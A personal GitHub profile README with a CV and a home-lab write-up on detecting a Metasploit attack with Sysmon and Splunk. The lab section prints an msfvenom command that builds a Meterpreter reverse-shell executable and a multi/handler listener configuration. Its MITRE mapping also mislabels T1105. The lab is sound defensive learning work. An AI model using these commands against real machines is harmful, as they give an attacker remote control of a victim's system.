```markdown
# Hello, I'm Arnold Mukucha
[![LinkedIn](https://img.shields.io/badge/-LinkedIn-0072b1?&style=for-the-badge&logo=linkedin&logoColor=white)](https://pl.linkedin.com/in/arnold-mukucha-8475a9203)

I am a Computer Engineering graduate with a strong interest in **networking, cloud computing, and information security**. I hold the **Microsoft Azure Administrator Associate**, **Cisco Certified Network Associate (CCNA)**, and **CompTIA Security+** certifications, reflecting a solid foundation in cloud administration, cybersecurity, and networking technologies.

I have hands-on experience with **Azure and AWS, Linux and Windows system administration, virtualization, and system monitoring**. I also possess practical knowledge of **relational databases**, including installation, configuration, performance tuning, backup, and optimization.

Additionally, I am familiar with the **MITRE ATT&CK framework**, information security best practices, and application security testing concepts. I also have foundational knowledge of **Artificial Intelligence and Machine Learning**, including basic machine learning algorithms and their practical applications.

I am committed to **continuous learning** and building **secure, scalable, and compliant cloud and IT infrastructures** that integrate traditional IT expertise with emerging technologies.

---

## Objective

To leverage my skills in **networking, cloud administration, and information security** to contribute to building **secure and reliable IT infrastructures** while developing expertise in **cybersecurity monitoring, threat detection, and incident response**.

---

## Skills

| Skill | Associated Project |
|------|-------------------|
| SIEM Implementation and Log Analysis | Malware Detection Lab |
| Network Traffic Monitoring and Attack Detection | Malware Detection Lab |
| Endpoint Monitoring and Telemetry Analysis | Malware Detection Lab |
| Threat Detection using SIEM | Malware Detection Lab |
| Cyber Kill Chain Analysis | Malware Detection Lab |

---

## Tools

### Network
![Wireshark](https://img.shields.io/badge/-Wireshark-1679A7?&style=for-the-badge&logo=Wireshark&logoColor=white)

### SIEM
![Microsoft Sentinel](https://img.shields.io/badge/-Microsoft_Sentinel-0078D4?&style=for-the-badge&logo=Microsoft&logoColor=white)
![Splunk](https://img.shields.io/badge/-Splunk-000000?&style=for-the-badge&logo=Splunk&logoColor=white)

### Security & Offensive Tools
![Kali Linux](https://img.shields.io/badge/-Kali_Linux-268BEE?&style=for-the-badge&logo=KaliLinux&logoColor=white)
![Metasploit](https://img.shields.io/badge/-Metasploit-2A2A2A?&style=for-the-badge&logo=Metasploit&logoColor=white)
![Sysmon](https://img.shields.io/badge/-Sysmon-5C2D91?&style=for-the-badge&logo=Windows&logoColor=white)

---

## 🏆 Certifications

[![CCNA](https://img.shields.io/badge/Cisco-CCNA-1BA0D7?style=for-the-badge&logo=cisco&logoColor=white)](https://www.credly.com/badges/189215b3-b345-4950-8bda-b480fa7792b4)

[![Security+](https://img.shields.io/badge/CompTIA-Security%2B-EA3E2C?style=for-the-badge&logo=comptia&logoColor=white)](https://www.credly.com/badges/fd6afdf3-2bb0-4cb4-8bc6-d9b8ecbba81b)

[![Azure Administrator](https://img.shields.io/badge/Microsoft-Azure%20Administrator%20Associate-0078D4?style=for-the-badge&logo=microsoftazure&logoColor=white)](https://learn.microsoft.com/en-us/users/arnoldmukucha-5265/credentials/53e123fcd518d77e)

---

## Credential Verification

Cisco Certified Network Associate (CCNA) — Cisco  
https://www.credly.com/badges/189215b3-b345-4950-8bda-b480fa7792b4  

CompTIA Security+ — CompTIA  
https://www.credly.com/badges/fd6afdf3-2bb0-4cb4-8bc6-d9b8ecbba81b  

Microsoft Certified: Azure Administrator Associate — Microsoft  
https://learn.microsoft.com/en-us/users/arnoldmukucha-5265/credentials/53e123fcd518d77e  

---

# Project: Malware Detection Lab using Splunk, Sysmon, and Metasploit

## Project Overview

This project demonstrates a **malware attack simulation and detection lab** built in a virtual environment. A malicious payload is generated using Metasploit and executed on a Windows virtual machine. System telemetry is captured using Sysmon and forwarded to Splunk for security monitoring and detection analysis.

The goal of this project is to simulate real-world attack behavior and detect malicious activity using **SIEM analysis and log-based detection techniques**.

---

## Lab Architecture

Attacker Machine: Kali Linux  
Target Machine: Windows 10  

Tools Used:

| Tool | Purpose |
|-----|------|
| Kali Linux | Attack simulation |
| Metasploit Framework | Malware payload creation |
| Sysmon | System activity monitoring |
| Splunk | Log collection and analysis |

Attack Flow

Kali Linux (Attacker)  
↓  
Malware Payload  
↓  
Windows 10 VM (Victim)  
↓  
Sysmon Logs  
↓  
Splunk SIEM  

---

## Lab Objectives

- Simulate malware attacks in a controlled environment
- Collect endpoint telemetry using Sysmon
- Analyze security logs using Splunk
- Detect malicious behavior using SIEM queries
- Map attack behavior to the Cyber Kill Chain and MITRE ATT&CK frameworks

---

## Windows Machine Setup

The Windows 10 virtual machine acts as the **target system** in the lab.

Software Installed:

- Sysmon
- Splunk Universal Forwarder

Important Sysmon Event IDs

Event ID 1 – Process Creation  
Event ID 3 – Network Connection  
Event ID 11 – File Creation  
Event ID 13 – Registry Modification  

---

## Kali Linux Setup

Kali Linux acts as the **attacker machine** in the lab.

Tools Used

- Metasploit Framework
- msfvenom

Purpose

The attacker machine simulates adversary behavior such as:

- Malware generation
- Reverse shell connections
- Remote command execution

---

## Payload Generation

The malicious payload used in this lab was generated using **msfvenom**, a payload generator included in the Metasploit Framework.

Example payload creation command:

msfvenom -p windows/meterpreter/reverse_tcp LHOST=<attacker_ip> LPORT=<port> -f exe > payload.exe

Parameter Explanation

- windows/meterpreter/reverse_tcp → Meterpreter reverse shell payload
- LHOST → Attacker machine IP address
- LPORT → Listening port on the attacker machine
- -f exe → Output format as Windows executable
- payload.exe → Generated payload file

---

## Listener Setup

A listener was configured in Metasploit to receive the reverse connection from the victim machine.

Example configuration:

use exploit/multi/handler  
set payload windows/meterpreter/reverse_tcp  
set LHOST <attacker_ip>  
set LPORT <port>  
run  

Once the victim executed the payload, a **Meterpreter session** was established allowing remote access to the system.

---

## Attack Simulation

Step 1 – Payload Generation  
A malicious payload is generated using Metasploit tools.

Step 2 – Payload Delivery  
The generated executable file is transferred to the Windows target machine.

Step 3 – Payload Execution  
The victim machine executes the malicious file which triggers the reverse shell connection.

Step 4 – Attacker Access  
Once executed, the attacker receives a remote session allowing command execution on the target system.  
This activity generates telemetry captured by Sysmon.

---

## Splunk Detection Queries

Process Creation Detection

index=sysmon EventCode=1

Used to detect suspicious process creation events.

Network Connection Detection

index=sysmon EventCode=3

Used to detect outbound connections to unknown external hosts.

File Creation Detection

index=sysmon EventCode=11

Used to detect suspicious files created by malware.

---

## Cyber Kill Chain Mapping

Reconnaissance  
Target system identified.

Weaponization  
Malware payload created.

Delivery  
Payload transferred to victim machine.

Exploitation  
Victim executes malicious file.

Installation  
Malware runs on the system.

Command and Control  
Reverse shell connects to attacker.

Actions on Objectives  
Attacker executes commands on the victim system.

---

## MITRE ATT&CK Mapping

T1204 – User Execution  
User executes malicious executable.

T1059 – Command Execution  
Attacker executes commands through the remote session.

T1105 – Command and Control  
Reverse shell communication between victim and attacker.

T1057 – Process Discovery  
Attacker enumerates processes on the target machine.

---

## Skills Demonstrated

- Malware behavior analysis
- SIEM log analysis
- Threat detection engineering
- Endpoint monitoring
- Cyber Kill Chain analysis
- MITRE ATT&CK framework mapping
```
